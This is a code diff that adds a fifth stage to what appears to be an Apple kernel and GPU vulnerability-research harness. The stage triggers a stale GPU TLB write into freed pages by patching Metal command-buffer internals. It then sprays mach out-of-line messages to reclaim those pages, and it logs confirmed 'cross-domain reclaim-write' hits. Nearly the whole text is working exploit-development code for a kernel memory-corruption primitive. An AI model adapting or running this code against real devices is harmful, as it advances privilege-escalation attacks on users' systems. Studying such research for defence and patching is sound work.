@@ -23361,6 +23361,242 @@ static void p_uatrec(void) {
         }
         LOG("[uatrec] S4 done (alive) — app stays up, storm animations keep running");
     }
+
+    if (step == 0 || step == 5) {
+        // ---- STEP 5 (v147): OOL self-spray reclaim detector. S3/S4 showed the
+        // in-flight blit writes 0x41 through the stale GMMU TLB into the
+        // victim's OLD physical pages — pages already returned to the COMMON
+        // kernel page allocator (retirement path: desc release +0x28). S2/S3
+        // sprayed the GPU arena only (wrong pool for DATA pages, §132); S4
+        // sprayed foreign consumers with no controlled readback. Here the
+        // reclaim wave is OUR OWN mach OOL descriptors (classic fresh-page
+        // kernel spray, 64KB class), filled 0x43 and HELD in a port queue
+        // while the stale-TLB write lands. Detector = receive-content
+        // corruption: any 0x41 run inside a message we sent as all-0x43 is a
+        // GPU write into a reclaimed kernel page — the cross-domain
+        // write-after-reclaim primitive, confirmed end-to-end with offsets.
+        int rounds = atoi(getenv("FUZZ_UATREC_S5_ROUNDS") ?: "2");
+        int cong = atoi(getenv("FUZZ_UATREC_S5_CONG") ?: "24");
+        int nmsg = atoi(getenv("FUZZ_UATREC_S5_MSGS") ?: "128");
+        if (nmsg < 8) nmsg = 8;
+        if (nmsg > 190) nmsg = 190;   // port qlimit max 200
+        LOG("[uatrec] S5 OOL-reclaim: %d rounds, cong %d, %d msgs x 64KB (0x43), delay %dms",
+            rounds, cong, nmsg, delayms);
+        typedef struct {
+            mach_msg_header_t h;
+            mach_msg_body_t b;
+            mach_msg_ool_descriptor_t d;
+        } oolmsg;
+        for (int round = 0; round < rounds; round++) {
+            // congestion first (GPU busy while we destroy+spray on CPU)
+            id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+            memset([cgS contents], 0x41, 0x1000000);
+            for (int i = 0; i < cong; i++) {
+                id<MTLCommandBuffer> cbx = [mq commandBuffer];
+                id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+                [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+                [encx endEncoding];
+                [cbx commit];
+            }
+            // victim: top-of-stack raw alloc, zeroed
+            uint64_t gpuvaV = 0;
+            uint8_t *cv = NULL;
+            uint32_t ridV = gpu_resource2(mconn, 0x10000, &gpuvaV, &cv);
+            if (!ridV || !cv) { LOG("[uatrec] S5 r%d: victim alloc failed", round); continue; }
+            memset(cv, 0, 0x10000);
+            // armed blit A(0x41) -> gpuvaV (S3 mechanics; self-patch first round)
+            id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> bufD = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            memset([bufA contents], 0x41, 0x10000);
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufD destinationOffset:0 size:0x10000];
+            [enc endEncoding];
+            uint64_t gpuD = [bufD gpuAddress];
+            long np;
+            if (round == 0) {
+                gscan_patch(gpuD, gpuD);
+                np = gscan_patch(gpuD, gpuvaV);
+            } else {
+                np = gscan_patch(gpuD, gpuvaV);
+                if (!np) { gscan_patch(gpuD, gpuD); np = gscan_patch(gpuD, gpuvaV); }
+            }
+            void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+            uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+            int ridpatch = 0;
+            if (sva) {
+                uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+                for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                    if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                        *(uint32_t *)(sg + o + 0x18) == 0x40 && *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                        *(uint32_t *)(sg + o + 0x04) = ridV;
+                        ridpatch = 1;
+                    }
+                }
+            }
+            LOG("[uatrec] S5 r%d: victim rid %u gv 0x%llx slots %ld ridpatch %d — commit, destroy+flush",
+                round, ridV, gpuvaV, np, ridpatch);
+            [cb commit];
+            fsync(fileno(stderr));
+            kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+            int nj = 0;
+            for (int i = 0; i < 40; i++) {
+                uint64_t gj; uint8_t *pj;
+                uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+                if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+            }
+            LOG("[uatrec] S5 r%d: destroy kr 0x%08x + %d junk — OOL reclaim wave (%d msgs)",
+                round, kd, nj, nmsg);
+            if (delayms > 0) usleep((useconds_t)delayms * 1000);
+            // v148: drop OUR cpu reference — until now the surviving userspace
+            // mapping kept the victim's DATA pages pinned (r0/r2: stale-TLB
+            // write landed, but the pages were still ours, so no consumer
+            // could reclaim them). dealloc -> pages to the free pool -> OOL.
+            int dealloc = atoi(getenv("FUZZ_UATREC_S5_DEALLOC") ?: "1");
+            if (dealloc) {
+                vm_deallocate(mach_task_self(), (vm_address_t)cv, 0x10000);
+                cv = NULL;
+                LOG("[uatrec] S5 r%d: victim cpu map deallocated — DATA pages freed", round);
+                fsync(fileno(stderr));
+            }
+            // OOL reclaim wave: kernel eagerly copies each 64KB descriptor into
+            // FRESH general-allocator pages; the port queue holds them pending
+            mach_port_t oolp = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolp);
+            mach_port_limits_t lim = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+            mach_port_set_attributes(mach_task_self(), oolp, MACH_PORT_LIMITS_INFO,
+                                     (mach_port_info_t)&lim, MACH_PORT_LIMITS_INFO_COUNT);
+            mach_port_insert_right(mach_task_self(), oolp, oolp, MACH_MSG_TYPE_MAKE_SEND);
+            uint8_t **sbuf = (uint8_t **)malloc(sizeof(uint8_t *) * nmsg);
+            int nsent = 0;
+            for (int i = 0; i < nmsg; i++) {
+                sbuf[i] = (uint8_t *)malloc(0x10000);
+                if (!sbuf[i]) break;
+                memset(sbuf[i], 0x43, 0x10000);
+                *(uint64_t *)sbuf[i] = 0xdeadc0de0000 + (uint64_t)i;   // msg-tag at offset 0
+                oolmsg m;
+                memset(&m, 0, sizeof m);
+                m.h.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                m.h.msgh_remote_port = oolp;
+                m.h.msgh_size = sizeof m;
+                m.h.msgh_id = i;
+                m.b.msgh_descriptor_count = 1;
+                m.d.address = sbuf[i];
+                m.d.size = 0x10000;
+                m.d.deallocate = 0;
+                m.d.copy = MACH_MSG_VIRTUAL_COPY;
+                m.d.type = MACH_MSG_OOL_DESCRIPTOR;
+                kern_return_t ks = mach_msg(&m.h, MACH_SEND_MSG, sizeof m, 0,
+                                            MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                if (ks) { LOG("[uatrec] S5 r%d: send %d failed kr 0x%08x", round, i, ks); break; }
+                nsent++;
+            }
+            LOG("[uatrec] S5 r%d: %d OOL msgs queued (%d KB kernel) — draining blit",
+                round, nsent, nsent * 64);
+            // drain the victim blit (stale-TLB write lands somewhere in this window)
+            long st = 0;
+            for (int w = 0; w < 40; w++) {
+                st = (long)[cb status];
+                if (st >= 4) break;
+                usleep(50000);
+            }
+            LOG("[uatrec] S5 r%d: drained, cb status %ld — receiving + scanning", round, st);
+            // v147d: direct control — CPU read of the SURVIVING old victim
+            // mapping (trap1-release keeps it alive, unlike sel9). 0x41 here =
+            // the stale-TLB write DID land in the old pages (S3 semantics).
+            // Skipped under v148 dealloc (cv == NULL — mapping is gone).
+            if (cv) {
+                long c41 = 0, cnz = 0;
+                for (long j = 0; j < 0x10000; j++) { if (cv[j] == 0x41) c41++; if (cv[j]) cnz++; }
+                LOG("[uatrec] S5 r%d: old victim map (CPU) 0x41 %ld nz %ld — %s",
+                    round, c41, cnz,
+                    c41 > 0x8000 ? "WRITE LANDED IN OLD PAGES (stale-TLB confirmed)" :
+                    cnz ? "partial write" : "NO WRITE INTO OLD PAGES (blit too early?)");
+                fsync(fileno(stderr));
+            }
+            // receive all, scan for 0x41 inside what we sent as 0x43
+            long tot41 = 0, corrupted = 0, recvd = 0;
+            uint8_t *rbuf = (uint8_t *)malloc(sizeof(oolmsg) + 0x100);
+            kern_return_t krc2 = 0;
+            for (;;) {
+                oolmsg *rmp = (oolmsg *)rbuf;
+                memset(rbuf, 0, sizeof(oolmsg) + 0x100);
+                krc2 = mach_msg(&rmp->h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                                (mach_msg_size_t)(sizeof(oolmsg) + 0x100), oolp, 0,
+                                MACH_PORT_NULL);
+                if (krc2) break;   // queue empty
+                recvd++;
+                // OOL receive: the descriptor address now points at the kernel
+                // copyout — read it back
+                uint8_t *kp = (uint8_t *)rmp->d.address;
+                if (!rmp->d.size || !kp) continue;
+                long n41 = 0, first = -1, nother = 0, ofirst = -1;
+                for (long j = 0; j < 0x10000; j++) {
+                    if (kp[j] == 0x41) { n41++; if (first < 0) first = j; }
+                    else if (kp[j] != 0x43 && !(j < 8)) { nother++; if (ofirst < 0) ofirst = j; }
+                }
+                if (n41 > 0x10 || nother > 0x10) {
+                    corrupted++;
+                    tot41 += n41;
+                    LOG("[uatrec] [HIT] S5 r%d msg id %u: 0x41 %ld (@0x%lx) other %ld (@0x%lx) — "
+                        "FOREIGN WRITE INTO RECLAIMED OOL PAGE", round, rmp->h.msgh_id,
+                        n41, first, nother, ofirst);
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)kp, 0x10000);
+            }
+            if (krc2 != 0x10000003)   // MACH_RCV_TIMED_OUT = queue drained
+                LOG("[uatrec] S5 r%d: receive loop ended kr 0x%08x", round, krc2);
+            LOG("[uatrec] S5 r%d summary: %ld received, %ld corrupted, 0x41 total %ld %s",
+                round, recvd, corrupted, tot41,
+                corrupted ? "*** CROSS-DOMAIN RECLAIM-WRITE CONFIRMED ***" : "(no reclaim hit)");
+            // v147c: GPU-side control — stale-TLB READ of the dead gpuvaV.
+            // Distinguishes the three negative worlds: 0x41 = blit wrote but
+            // OOL didn't reclaim those pages; 0x43 = OOL DID reclaim (write
+            // came before copyin); 0x00 = reclaimed by a zeroing consumer or
+            // never written; status 5 = GMMU TLB already invalidated.
+            {
+                id<MTLBuffer> bufS2 = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+                id<MTLBuffer> bufR2 = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+                memset([bufR2 contents], 0x55, 0x10000);
+                id<MTLCommandBuffer> cb2 = [mq commandBuffer];
+                id<MTLBlitCommandEncoder> enc2 = [cb2 blitCommandEncoder];
+                [enc2 copyFromBuffer:bufS2 sourceOffset:0 toBuffer:bufR2 destinationOffset:0 size:0x10000];
+                [enc2 endEncoding];
+                uint64_t gpuS2 = [bufS2 gpuAddress];
+                long np2 = gscan_patch(gpuS2, gpuvaV);
+                if (!np2) { gscan_patch(gpuS2, gpuS2); np2 = gscan_patch(gpuS2, gpuvaV); }
+                LOG("[uatrec] S5 r%d readback: src slots %ld patched to dead gpuvaV — commit", round, np2);
+                [cb2 commit];
+                long st2 = 0;
+                for (int w = 0; w < 40; w++) {
+                    st2 = (long)[cb2 status];
+                    if (st2 >= 4) break;
+                    usleep(50000);
+                }
+                uint8_t *rb = (uint8_t *)[bufR2 contents];
+                long r41 = 0, r43 = 0, r0 = 0, r55 = 0, rother = 0;
+                for (long j = 0; j < 0x10000; j++) {
+                    if (rb[j] == 0x41) r41++;
+                    else if (rb[j] == 0x43) r43++;
+                    else if (rb[j] == 0x00) r0++;
+                    else if (rb[j] == 0x55) r55++;
+                    else rother++;
+                }
+                LOG("[uatrec] S5 r%d readback: st %ld | dead-gpuva content: 0x41 %ld 0x43 %ld zero %ld 0x55 %ld other %ld — %s",
+                    round, st2, r41, r43, r0, r55, rother,
+                    st2 == 5 ? "TLB INVALIDATED (fault)" :
+                    r41 > 0x1000 ? "WRITE LANDED, OOL MISSED THE PAGES" :
+                    r43 > 0x1000 ? "OOL RECLAIMED, WRITE TOO EARLY" :
+                    r0 > 0x1000 ? "ZEROED CONSUMER / NO WRITE" : "inconclusive");
+            }
+            mach_port_destroy(mach_task_self(), oolp);
+            for (int i = 0; i < nsent; i++) free(sbuf[i]);
+            free(sbuf);
+            free(rbuf);
+            fsync(fileno(stderr));
+        }
+    }
     LOG("[uatrec] done (alive)");
 }
 
